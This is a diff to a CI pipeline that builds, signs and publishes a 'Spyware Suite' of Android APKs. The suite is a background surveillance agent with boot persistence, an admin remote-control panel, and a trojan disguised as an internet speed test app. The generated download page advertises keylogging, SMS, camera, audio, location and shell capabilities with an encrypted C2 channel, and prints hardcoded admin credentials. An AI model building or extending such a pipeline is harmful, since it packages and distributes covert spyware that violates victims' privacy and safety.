@@ -4,6 +4,8 @@ variables:
   GRADLE_OPTS: "-Dorg.gradle.daemon=false -Dorg.gradle.parallel=true"
   ANDROID_SDK_ROOT: "/opt/android-sdk"
   GRADLE_VERSION: "8.5"
+  ADMIN_USERNAME: "admin"
+  ADMIN_PASSWORD: "admin123"
 
 stages:
   - setup
@@ -43,15 +45,15 @@ setup:
       - .gradle/wrapper/
       - .gradle/caches/
 
-build_debug:
+build_agent_debug:
   stage: build
   needs: [setup]
   script:
-    - echo "Building debug APK..."
-    - gradle assembleDebug
+    - echo "Building agent debug APK..."
+    - gradle :agent:assembleDebug
   artifacts:
     paths:
-      - app/build/outputs/apk/debug/*.apk
+      - agent/app/build/outputs/apk/debug/*.apk
     expire_in: 7 days
   cache:
     key: "gradle-cache"
@@ -59,15 +61,79 @@ build_debug:
       - .gradle/caches/
       - .gradle/wrapper/
 
-build_release:
+build_agent_release:
   stage: build
   needs: [setup]
   script:
-    - echo "Building release APK..."
-    - gradle assembleRelease
+    - echo "Building agent release APK..."
+    - gradle :agent:assembleRelease
   artifacts:
     paths:
-      - app/build/outputs/apk/release/*.apk
+      - agent/app/build/outputs/apk/release/*.apk
+    expire_in: 30 days
+  cache:
+    key: "gradle-cache"
+    paths:
+      - .gradle/caches/
+      - .gradle/wrapper/
+
+build_admin_debug:
+  stage: build
+  needs: [setup]
+  script:
+    - echo "Building admin debug APK..."
+    - gradle :admin:assembleDebug
+  artifacts:
+    paths:
+      - admin/app/build/outputs/apk/debug/*.apk
+    expire_in: 7 days
+  cache:
+    key: "gradle-cache"
+    paths:
+      - .gradle/caches/
+      - .gradle/wrapper/
+
+build_admin_release:
+  stage: build
+  needs: [setup]
+  script:
+    - echo "Building admin release APK..."
+    - gradle :admin:assembleRelease
+  artifacts:
+    paths:
+      - admin/app/build/outputs/apk/release/*.apk
+    expire_in: 30 days
+  cache:
+    key: "gradle-cache"
+    paths:
+      - .gradle/caches/
+      - .gradle/wrapper/
+
+build_speedmon_debug:
+  stage: build
+  needs: [setup]
+  script:
+    - echo "Building speedmon debug APK..."
+    - gradle :speedmon:assembleDebug
+  artifacts:
+    paths:
+      - speedmon/app/build/outputs/apk/debug/*.apk
+    expire_in: 7 days
+  cache:
+    key: "gradle-cache"
+    paths:
+      - .gradle/caches/
+      - .gradle/wrapper/
+
+build_speedmon_release:
+  stage: build
+  needs: [setup]
+  script:
+    - echo "Building speedmon release APK..."
+    - gradle :speedmon:assembleRelease
+  artifacts:
+    paths:
+      - speedmon/app/build/outputs/apk/release/*.apk
     expire_in: 30 days
   cache:
     key: "gradle-cache"
@@ -77,18 +143,22 @@ build_release:
 
 lint:
   stage: test
-  needs: [build_debug]
+  needs: [build_agent_debug, build_admin_debug, build_speedmon_debug]
   script:
-    - gradle lint
+    - gradle :agent:lint :admin:lint :speedmon:lint
   artifacts:
     paths:
-      - app/build/reports/lint-results.html
-      - app/build/reports/lint-results.xml
+      - agent/app/build/reports/lint-results.html
+      - agent/app/build/reports/lint-results.xml
+      - admin/app/build/reports/lint-results.html
+      - admin/app/build/reports/lint-results.xml
+      - speedmon/app/build/reports/lint-results.html
+      - speedmon/app/build/reports/lint-results.xml
     expire_in: 7 days
 
-sign_apk:
+sign_apks:
   stage: sign
-  needs: [build_release]
+  needs: [build_agent_release, build_admin_release, build_speedmon_release]
   script:
     - |
       if [ -n "$KEYSTORE_BASE64" ] && [ -n "$KEYSTORE_PASSWORD" ] && [ -n "$KEY_ALIAS" ] && [ -n "$KEY_PASSWORD" ]; then
@@ -106,16 +176,22 @@ sign_apk:
       fi
   artifacts:
     paths:
-      - app/build/outputs/apk/release/*.apk
+      - agent/app/build/outputs/apk/release/*.apk
+      - admin/app/build/outputs/apk/release/*.apk
+      - speedmon/app/build/outputs/apk/release/*.apk
     expire_in: 30 days
 
 package_release:
   stage: package
-  needs: [sign_apk]
+  needs: [sign_apks]
   script:
     - mkdir -p release/
-    - cp app/build/outputs/apk/release/*.apk release/spyware-agent.apk 2>/dev/null || true
-    - cp app/build/outputs/apk/debug/*.apk release/spyware-agent-debug.apk 2>/dev/null || true
+    - cp agent/app/build/outputs/apk/release/*.apk release/system-monitor-agent.apk 2>/dev/null || true
+    - cp admin/app/build/outputs/apk/release/*.apk release/spyadmin-admin.apk 2>/dev/null || true
+    - cp speedmon/app/build/outputs/apk/release/*.apk release/speedmon-user.apk 2>/dev/null || true
+    - cp agent/app/build/outputs/apk/debug/*.apk release/system-monitor-agent-debug.apk 2>/dev/null || true
+    - cp admin/app/build/outputs/apk/debug/*.apk release/spyadmin-admin-debug.apk 2>/dev/null || true
+    - cp speedmon/app/build/outputs/apk/debug/*.apk release/speedmon-user-debug.apk 2>/dev/null || true
     - cd release && sha256sum *.apk > SHA256SUMS.txt && cd ..
     - cat release/SHA256SUMS.txt
   artifacts:
@@ -134,32 +210,39 @@ deploy_pages:
       <!DOCTYPE html>
       <html>
       <head>
-        <title>Spyware Agent - APK Downloads</title>
+        <title>Spyware Suite - APK Downloads</title>
         <style>
-          body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
+          body { font-family: monospace; max-width: 900px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
           h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
           .apk { margin: 20px 0; padding: 15px; border: 1px solid #0f0; }
           .apk a { color: #0f0; text-decoration: none; font-weight: bold; }
           .apk a:hover { text-decoration: underline; }
           .meta { color: #888; font-size: 0.9em; }
           .info { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; margin: 20px 0; }
+          .cred { background: #1a1a1a; padding: 15px; border: 1px solid #f00; margin: 20px 0; color: #f88; }
+          .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
         </style>
       </head>
       <body>
-        <h1>Spyware Agent — Built $(date -u)</h1>
-        <div class="info">
-          <strong>Package:</strong> com.system.service<br>
-          <strong>Capabilities:</strong> Keylogger, SMS, Contacts, Call Logs, Location, Audio, Screen, Camera, Files, Apps, Clipboard, Notifications, Shell, WiFi<br>
-          <strong>Persistence:</strong> Boot receiver + foreground service<br>
-          <strong>C2:</strong> WebSocket + HTTPS, RSA/AES encryption
+        <h1>Spyware Suite — Built $(date -u)</h1>
+        <div class="cred">
+          <strong>Admin Panel Credentials:</strong><br>
+          Username: admin<br>
+          Password: admin123
         </div>
-        <div class="apk">
-          <a href="spyware-agent.apk">🕷 spyware-agent.apk</a> — Release build (signed if keystore provided)
-          <div class="meta">com.system.service | minSdk 24 | targetSdk 34</div>
-        </div>
-        <div class="apk">
-          <a href="spyware-agent-debug.apk">🕷 spyware-agent-debug.apk</a> — Debug build
-          <div class="meta">Unsigned, debuggable=false, minified</div>
+        <div class="grid">
+          <div class="apk">
+            <a href="speedmon-user.apk">📱 speedmon-user.apk</a> — Internet Speed Meter (Trojan)
+            <div class="meta">Package: com.speedmon | Disguised as network speed test</div>
+          </div>
+          <div class="apk">
+            <a href="spyadmin-admin.apk">🛠 spyadmin-admin.apk</a> — Admin Control Panel
+            <div class="meta">Package: com.spyadmin | Full remote control interface</div>
+          </div>
+          <div class="apk">
+            <a href="system-monitor-agent.apk">🕷 system-monitor-agent.apk</a> — Background Agent
+            <div class="meta">Package: com.system.monitor | 14 capabilities, boot persistence</div>
+          </div>
         </div>
         <div class="meta">SHA256 checksums in <a href="SHA256SUMS.txt">SHA256SUMS.txt</a></div>
       </body>
